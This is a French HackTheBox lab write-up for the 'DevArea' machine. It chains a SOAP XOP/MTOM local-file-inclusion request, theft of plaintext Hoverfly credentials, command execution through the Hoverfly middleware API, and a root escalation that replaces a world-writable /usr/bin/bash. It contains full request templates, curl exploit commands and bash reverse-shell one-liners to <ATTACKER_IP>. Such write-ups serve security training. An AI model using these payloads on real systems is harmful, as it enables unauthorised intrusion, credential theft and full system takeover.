🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# DevArea : HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/88d6d295a9624c91cbdae1e0215cb354.png" width="120"/>
<div>

**Difficulté**: Medium  
**OS**: Linux  
**Type**: Web / Middleware  

</div>
</div>

---

## Résumé de la chaîne d'exploitation

```
LFI via XOP/MTOM (SOAP) → /etc/systemd/system/hoverfly.service
→ Credentials Hoverfly → JWT token
→ RCE via middleware (reverse shell bash)
→ /usr/bin/bash world-writable + sudo syswatch.sh → ROOT
```

---

## Énumération

### Scan Nmap

```bash
nmap -sV -sC <TARGET_IP> -oN scan.txt
```

Ports ouverts :
- **8080** : Service SOAP employés (`/employeeservice`)
- **8888** : API admin Hoverfly

### Découverte des services

Le service SOAP sur le port 8080 expose un endpoint `submitReport`.  
Le panel admin Hoverfly sur le port 8888 expose `/api/token-auth` et `/api/v2/hoverfly/middleware`.

---

## Foothold : LFI via XOP/MTOM

### Vulnérabilité

L'endpoint SOAP `submitReport` accepte des requêtes MTOM (Message Transmission Optimization Mechanism). Le champ `<content>` supporte les références `<xop:Include>`, qui peuvent pointer vers des **fichiers locaux** via le schéma `file://`, résultant en une **LFI non authentifiée**.

### Template de requête

```
--MIMEBoundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root@example.com>

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="..." xmlns:tns="http://devarea.htb/">
<soap:Body><tns:submitReport><arg0>
  <confidential>false</confidential>
  <content>
    <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
      href="file:///etc/systemd/system/hoverfly.service"/>
  </content>
  <department>x</department>
  <employeeName>x</employeeName>
</arg0></tns:submitReport></soap:Body>
</soap:Envelope>
--MIMEBoundary--
```

La réponse contient le contenu du fichier encodé en base64 dans `<return>`.

### Extraction des credentials Hoverfly

```bash
curl -s -X POST http://<TARGET_IP>:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root@example.com>"; start-info="text/xml"' \
  --data-binary @lfi_payload.txt
```

Le fichier de service contient une ligne du type :
```
ExecStart=/usr/bin/hoverfly -webserver -pp 8080 -ap 8888 \
  -username admin -password <HOVERFLY_PASSWORD>
```

On extrait le mot de passe en clair depuis le flag `-password`.

---

## Shell utilisateur : RCE via middleware Hoverfly

### Authentification à Hoverfly

```bash
curl -s -X POST http://<TARGET_IP>:8888/api/token-auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"<HOVERFLY_PASSWORD>"}'
```

On reçoit un token JWT.

### RCE via middleware

La fonctionnalité middleware de Hoverfly permet de spécifier un binaire + script à exécuter sur chaque requête proxifiée. En configurant `/bin/bash` comme binaire et un one-liner de reverse shell comme script, on déclenche une exécution de commande arbitraire :

```bash
curl -s -X PUT http://<TARGET_IP>:8888/api/v2/hoverfly/middleware \
  -H 'Authorization: Bearer <JWT>' \
  -H 'Content-Type: application/json' \
  -d '{
    "binary": "/bin/bash",
    "script": "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1 &"
  }'
```

### Listener

```bash
nc -lvnp 4444
```

On reçoit un shell en tant qu'utilisateur du service.

---

## User Flag

```bash
cat ~/user.txt
```

---

## Élévation de privilèges

### Énumération

```bash
find / -writable -type f 2>/dev/null | grep -v proc
sudo -l
```

Points clés :
- `/usr/bin/bash` est **world-writable**
- L'utilisateur peut exécuter `sudo /opt/syswatch/syswatch.sh` sans mot de passe

### Plan d'attaque

Puisque `/usr/bin/bash` est world-writable, on peut le remplacer par un wrapper malveillant qui déclenche un reverse shell root avant de restaurer le binaire original. Quand `sudo /opt/syswatch/syswatch.sh` s'exécute (il appelle `/usr/bin/bash` en interne), notre payload se déclenche en tant que root.

### Étapes

**1. Sauvegarde du bash original :**

```bash
cp /bin/bash /tmp/bash.bak
```

**2. Écriture du `/usr/bin/bash` malveillant :**

```python
python3 -c "
import binascii
evil = (
    b'#!/tmp/bash.bak\n'
    b'bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1 &\n'
    b'cp /tmp/bash.bak /usr/bin/bash\n'
    b'exec /tmp/bash.bak \"\$@\"\n'
)
open('/tmp/evil_bash','wb').write(evil)
"
chmod +x /tmp/evil_bash
```

> On écrit d'abord dans `/tmp` pour éviter les erreurs `ETXTBSY` (text file busy), puis on copie vers `/usr/bin/bash`.

**3. Démarrage du listener root :**

```bash
nc -lvnp 4445
```

**4. Déclenchement de la chaîne :**

```bash
/bin/dash -c '
  killall -9 bash;
  sleep 2;
  cp /tmp/evil_bash /usr/bin/bash;
  sudo /opt/syswatch/syswatch.sh --version
' &
```

> On utilise `/bin/dash` au lieu de bash pour ne pas tuer sa propre session.  
> `killall -9 bash` libère le verrou kernel sur `/usr/bin/bash` pour pouvoir l'écraser.

### Shell Root

On reçoit un shell en tant que `root`.

---

## Root Flag

```bash
cat /root/root.txt
```